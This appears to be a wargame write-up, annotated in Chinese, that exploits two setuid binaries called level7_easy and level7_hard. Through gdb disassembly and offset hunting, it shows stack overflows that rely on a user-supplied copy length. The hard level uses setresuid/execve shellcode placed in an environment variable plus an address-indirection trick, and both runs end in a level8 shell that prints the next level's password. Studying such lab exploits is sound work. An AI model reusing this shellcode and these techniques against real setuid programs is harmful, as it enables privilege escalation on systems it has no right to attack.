
level7_easy:

(gdb) disass main
Dump of assembler code for function main:
0x0804843c <main+0>:    push   %ebp
0x0804843d <main+1>:    mov    %esp,%ebp
0x0804843f <main+3>:    sub    $0x418,%esp
0x08048445 <main+9>:    and    $0xfffffff0,%esp
0x08048448 <main+12>:   mov    $0x0,%eax
0x0804844d <main+17>:   add    $0xf,%eax
0x08048450 <main+20>:   add    $0xf,%eax
0x08048453 <main+23>:   shr    $0x4,%eax
0x08048456 <main+26>:   shl    $0x4,%eax   
0x08048459 <main+29>:   sub    %eax,%esp   /*eax = 16 */
0x0804845b <main+31>:   cmpl   $0x1,0x8(%ebp) /* 比较参数的数量(argc)是否大于一,若没有输入参数，这退出*/
0x0804845f <main+35>:   jg     0x8048482 <main+70>      
0x08048461 <main+37>:   sub    $0x8,%esp
0x08048464 <main+40>:   push   $0x80485d8
0x08048469 <main+45>:   push   $0x80485df
0x0804846e <main+50>:   call   0x8048354 <printf@plt>
0x08048473 <main+55>:   add    $0x10,%esp
0x08048476 <main+58>:   movl   $0x1,-0x40c(%ebp)
0x08048480 <main+68>:   jmp    0x8048500 <main+196>
0x08048482 <main+70>:   sub    $0x4,%esp
0x08048485 <main+73>:   sub    $0xc,%esp
0x08048488 <main+76>:   call   0x8048374 <geteuid@plt>   /* 获取有效用户id，应该返回文件所有者的id，例如对passwd文件返回root的id*/
0x0804848d <main+81>:   add    $0xc,%esp
0x08048490 <main+84>:   push   %eax            /*有效用户id压栈*/
0x08048491 <main+85>:   sub    $0x8,%esp
0x08048494 <main+88>:   call   0x8048374 <geteuid@plt>
0x08048499 <main+93>:   add    $0x8,%esp
0x0804849c <main+96>:   push   %eax
0x0804849d <main+97>:   sub    $0x4,%esp
0x080484a0 <main+100>:  call   0x8048374 <geteuid@plt>
0x080484a5 <main+105>:  add    $0x4,%esp
0x080484a8 <main+108>:  push   %eax
0x080484a9 <main+109>:  call   0x8048334 <setresuid@plt>    /*上面连续获取三次euid，为调用setreasuid做准备*/
0x080484ae <main+114>:  add    $0x10,%esp
0x080484b1 <main+117>:  sub    $0x4,%esp
0x080484b4 <main+120>:  mov    0xc(%ebp),%eax
0x080484b7 <main+123>:  add    $0x8,%eax
0x080484ba <main+126>:  sub    $0x8,%esp
0x080484bd <main+129>:  pushl  (%eax)
0x080484bf <main+131>:  call   0x8048364 <atoi@plt>       /*这里转换的是argv[2]，将它转换为数字，作为memcpy的第三个参数size*/
0x080484c4 <main+136>:  add    $0xc,%esp
---Type <return> to continue, or q <return> to quit---
0x080484c7 <main+139>:  push   %eax
0x080484c8 <main+140>:  mov    0xc(%ebp),%eax
0x080484cb <main+143>:  add    $0x4,%eax
0x080484ce <main+146>:  pushl  (%eax)            /*将argv[1]压入堆栈，作为memcpy的第二个参数 source */
0x080484d0 <main+148>:  lea    -0x408(%ebp),%eax
0x080484d6 <main+154>:  push   %eax     /*作为memcpy的第一个参数,dest*/
0x080484d7 <main+155>:  call   0x8048344 <memcpy@plt>
0x080484dc <main+160>:  add    $0x10,%esp
0x080484df <main+163>:  sub    $0x8,%esp
0x080484e2 <main+166>:  lea    -0x408(%ebp),%eax
0x080484e8 <main+172>:  push   %eax
0x080484e9 <main+173>:  push   $0x80485df      /* 保存字符串"%s" */
0x080484ee <main+178>:  call   0x8048354 <printf@plt>  /**/
0x080484f3 <main+183>:  add    $0x10,%esp
0x080484f6 <main+186>:  movl   $0x0,-0x40c(%ebp)
0x08048500 <main+196>:  mov    -0x40c(%ebp),%eax
0x08048506 <main+202>:  leave  
0x08048507 <main+203>:  ret    
End of assembler dump.

/*memcpy(dest, src(user_control), num(user_control))*/
/**/

(gdb) r $(perl -e 'print"A"x(1250)') 1040
Starting program: /tmp/level7/level7_easy $(perl -e 'print"A"x(1250)') 1040

Breakpoint 4, 0x080484d7 in main ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...........
AAAAAAAAA
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
(gdb) r $(perl -e 'print"A"x(1250)') 1037
Starting program: /tmp/level7/level7_easy $(perl -e 'print"A"x(1250)') 1037
Breakpoint 4, 0x080484d7 in main ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
................
AAAAAAAAAAAA
Program received signal SIGSEGV, Segmentation fault.
0x00e47e4f in __libc_start_main () from /lib/libc.so.6

/* 填充字节数量从1037到1040就可覆盖返回地址*/
[level7@logic level7]$ 
[level7@logic level7]$ ./getenv_easy PAYLOAD
PAYLOAD is at 0xbfffdfaa
[level7@logic level7]$ ./level7_easy $(perl -e 'print"A"x(1036)."\xaa\xdf\xff\xbf"') 1040
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAbash-3.2$ whoami
level8
bash-3.2$ cd /home/level8
bash-3.2$ more .pass
Ee3yohji


level7_hard

08048444 <main>:
 8048444:       8d 4c 24 04             lea    0x4(%esp),%ecx  /* argc的地址保存到ecx */
 8048448:       83 e4 f0                and    $0xfffffff0,%esp 
 804844b:       ff 71 fc                pushl  0xfffffffc(%ecx)
 804844e:       55                      push   %ebp
 804844f:       89 e5                   mov    %esp,%ebp
 8048451:       57                      push   %edi
 8048452:       56                      push   %esi
 8048453:       53                      push   %ebx
 8048454:       51                      push   %ecx
 8048455:       81 ec 18 04 00 00       sub    $0x418,%esp
 804845b:       89 8d e8 fb ff ff       mov    %ecx,0xfffffbe8(%ebp)
 8048461:       8b 85 e8 fb ff ff       mov    0xfffffbe8(%ebp),%eax
 8048467:       83 38 01                cmpl   $0x1,(%eax)     /* 比较argc是否大于1*/
 804846a:       7f 18                   jg     8048484 <main+0x40>
 804846c:       c7 04 24 e0 85 04 08    movl   $0x80485e0,(%esp)
 8048473:       e8 d4 fe ff ff          call   804834c <puts@plt>
 8048478:       c7 85 ec fb ff ff 01    movl   $0x1,0xfffffbec(%ebp)
 804847f:       00 00 00
 8048482:       eb 76                   jmp    80484fa <main+0xb6>
 8048484:       e8 d3 fe ff ff          call   804835c <geteuid@plt>
 8048489:       89 c3                   mov    %eax,%ebx
 804848b:       e8 cc fe ff ff          call   804835c <geteuid@plt>                                              
 8048490:       89 c6                   mov    %eax,%esi                                                          
 8048492:       e8 c5 fe ff ff          call   804835c <geteuid@plt>                                              
 8048497:       89 5c 24 08             mov    %ebx,0x8(%esp)                                                     
 804849b:       89 74 24 04             mov    %esi,0x4(%esp)                                                     
 804849f:       89 04 24                mov    %eax,(%esp)                                                        
 80484a2:       e8 75 fe ff ff          call   804831c <setresuid@plt>                                            
 80484a7:       8b 95 e8 fb ff ff       mov    0xfffffbe8(%ebp),%edx                                              
 80484ad:       8b 42 04                mov    0x4(%edx),%eax                                                     
 80484b0:       83 c0 08                add    $0x8,%eax                                                          
 80484b3:       8b 00                   mov    (%eax),%eax                                                        
 80484b5:       89 04 24                mov    %eax,(%esp)                                                        
 80484b8:       e8 7f fe ff ff          call   804833c <atoi@plt>                                                 
 80484bd:       89 c1                   mov    %eax,%ecx                                                          
 80484bf:       8b 95 e8 fb ff ff       mov    0xfffffbe8(%ebp),%edx                                              
 80484c5:       8b 42 04                mov    0x4(%edx),%eax                                                     
 80484c8:       83 c0 04                add    $0x4,%eax    
 80484cb:       8b 10                   mov    (%eax),%edx                                                        
 80484cd:       8d 85 f0 fb ff ff       lea    0xfffffbf0(%ebp),%eax                                              
 80484d3:       89 c7                   mov    %eax,%edi                                                          
 80484d5:       89 d6                   mov    %edx,%esi                                                          
 80484d7:       fc                      cld                                                                       
 80484d8:       f3 a4                   rep movsb %ds:(%esi),%es:(%edi)                                           
 80484da:       8d 85 f0 fb ff ff       lea    0xfffffbf0(%ebp),%eax                                              
 80484e0:       89 44 24 04             mov    %eax,0x4(%esp)                                                     
 80484e4:       c7 04 24 e6 85 04 08    movl   $0x80485e6,(%esp)                                                  
 80484eb:       e8 3c fe ff ff          call   804832c <printf@plt>                                               
 80484f0:       c7 85 ec fb ff ff 00    movl   $0x0,0xfffffbec(%ebp)                                              
 80484f7:       00 00 00                                                                                          
 80484fa:       8b 85 ec fb ff ff       mov    0xfffffbec(%ebp),%eax                                              
 8048500:       81 c4 18 04 00 00       add    $0x418,%esp                                                        
 8048506:       59                      pop    %ecx                                                               
 8048507:       5b                      pop    %ebx                                                               
 8048508:       5e                      pop    %esi                                                               
 8048509:       5f                      pop    %edi                                                               
 804850a:       5d                      pop    %ebp                                                               
 804850b:       8d 61 fc                lea    0xfffffffc(%ecx),%esp                                              
 804850e:       c3                      ret                                                                       
 804850f:       90                      nop                                                                       



 (gdb) disass main
Dump of assembler code for function main:
0x08048444 <main+0>:    lea    0x4(%esp),%ecx
0x08048448 <main+4>:    and    $0xfffffff0,%esp
0x0804844b <main+7>:    pushl  -0x4(%ecx)
0x0804844e <main+10>:   push   %ebp
0x0804844f <main+11>:   mov    %esp,%ebp
0x08048451 <main+13>:   push   %edi
0x08048452 <main+14>:   push   %esi
0x08048453 <main+15>:   push   %ebx
0x08048454 <main+16>:   push   %ecx
0x08048455 <main+17>:   sub    $0x418,%esp
0x0804845b <main+23>:   mov    %ecx,-0x418(%ebp)
0x08048461 <main+29>:   mov    -0x418(%ebp),%eax
0x08048467 <main+35>:   cmpl   $0x1,(%eax)      /*比较argc 是否大于1，小于等于1就退出*/
0x0804846a <main+38>:   jg     0x8048484 <main+64>
0x0804846c <main+40>:   movl   $0x80485e0,(%esp)
0x08048473 <main+47>:   call   0x804834c <puts@plt>
0x08048478 <main+52>:   movl   $0x1,-0x414(%ebp)
0x08048482 <main+62>:   jmp    0x80484fa <main+182>
0x08048484 <main+64>:   call   0x804835c <geteuid@plt>
0x08048489 <main+69>:   mov    %eax,%ebx
0x0804848b <main+71>:   call   0x804835c <geteuid@plt>
0x08048490 <main+76>:   mov    %eax,%esi
0x08048492 <main+78>:   call   0x804835c <geteuid@plt>
0x08048497 <main+83>:   mov    %ebx,0x8(%esp)
0x0804849b <main+87>:   mov    %esi,0x4(%esp)
0x0804849f <main+91>:   mov    %eax,(%esp)
0x080484a2 <main+94>:   call   0x804831c <setresuid@plt> /* 设置用户为有效用户id*/
0x080484a7 <main+99>:   mov    -0x418(%ebp),%edx
0x080484ad <main+105>:  mov    0x4(%edx),%eax
0x080484b0 <main+108>:  add    $0x8,%eax
0x080484b3 <main+111>:  mov    (%eax),%eax
0x080484b5 <main+113>:  mov    %eax,(%esp)      /* argv[2]的地址保存到栈上 */
0x080484b8 <main+116>:  call   0x804833c <atoi@plt> /* 将argv[2]转换为数字*/
0x080484bd <main+121>:  mov    %eax,%ecx
0x080484bf <main+123>:  mov    -0x418(%ebp),%edx
0x080484c5 <main+129>:  mov    0x4(%edx),%eax
0x080484c8 <main+132>:  add    $0x4,%eax
0x080484cb <main+135>:  mov    (%eax),%edx
0x080484cd <main+137>:  lea    -0x410(%ebp),%eax
0x080484d3 <main+143>:  mov    %eax,%edi
0x080484d5 <main+145>:  mov    %edx,%esi
0x080484d7 <main+147>:  cld    
0x080484d8 <main+148>:  rep movsb %ds:(%esi),%es:(%edi) /* rep movsb 将数据从esi指定的缓冲区copy到edi指定的缓冲区*/
0x080484da <main+150>:  lea    -0x410(%ebp),%eax        /* copy的字节数由ecx指定，也就是上面atoi的返回值*/  
0x080484e0 <main+156>:  mov    %eax,0x4(%esp)
0x080484e4 <main+160>:  movl   $0x80485e6,(%esp)
0x080484eb <main+167>:  call   0x804832c <printf@plt>
0x080484f0 <main+172>:  movl   $0x0,-0x414(%ebp)
0x080484fa <main+182>:  mov    -0x414(%ebp),%eax
0x08048500 <main+188>:  add    $0x418,%esp
0x08048506 <main+194>:  pop    %ecx
0x08048507 <main+195>:  pop    %ebx
0x08048508 <main+196>:  pop    %esi
0x08048509 <main+197>:  pop    %edi
0x0804850a <main+198>:  pop    %ebp
0x0804850b <main+199>:  lea    -0x4(%ecx),%esp   /* 这里会导致我们填充的值减去4 */
0x0804850e <main+202>:  ret    
End of assembler dump.
(gdb) 


Starting program: /tmp/level7/level7_hard $(perl -e 'print"A"x(1024)."BBBB"') 1028
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
.......
Breakpoint 3, 0x0804850e in main ()
(gdb) x/x $esp
0x4242423e:     Cannot access memory at address 0x4242423e

填充的B变成了\x3e(B是0x42, 42 - 4 = 3e)，因此
(gdb) r $(perl -e 'print"A"x(1024)."\x46BBB"') 1028 
Starting program: /tmp/level7/level7_hard $(perl -e 'print"A"x(1024)."\x46BBB"') 1028
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Breakpoint 3, 0x0804850e in main ()
(gdb) x/x $esp
0x42424242:     Cannot access memory at address 0x42424242  /* OK只要把第一个字节加四就可以了*/
(gdb)

[level7@logic level7]$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
[level7@logic level7]$ ./getenv_easy PAYLOAD
PAYLOAD is at 0xbfffdfa6

由于esp中保存着指令的地址，而我们覆盖的是esp的值，而不是修改esp保存的地址值，因此我们不能将"BBBB"直接替换为
PAYLOAD的地址，如果这样替换，那么PAYLOAD的头四个字节(\x6a\x31\x58\x99)就会被解释为指令的地址，因此我们需要
另外一个环境变量，这个环境变量的内容为PAYLOAD的地址，用这个环境变量的地址替换"BBBB"来覆盖esp

[level7@logic level7]$ export ADDR=$'\xa6\xdf\xff\xbf'
[level7@logic level7]$ ./getenv_easy ADDR             
ADDR is at 0xbfffdf36

这样覆盖esp之后： esp = 0xbfffdf36 (其中内容为\xa6\xdf\xff\xbf)
                  ret 弹出esp的内容作为指令的地址: eip = 0xbfffdfa6，这样eip就指向了我们PAYLOAD的地址


                                                                 (别忘了这里地址加上4)
[level7@logic level7]$ ./level7_hard $(perl -e 'print"A"x(1024)."\x3a\xdf\xff\xbf"') 1028
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
............
bash-3.2$ whoami 
level8
bash-3.2$ cd /home/level8
bash-3.2$ more .pass
Ee3yohji
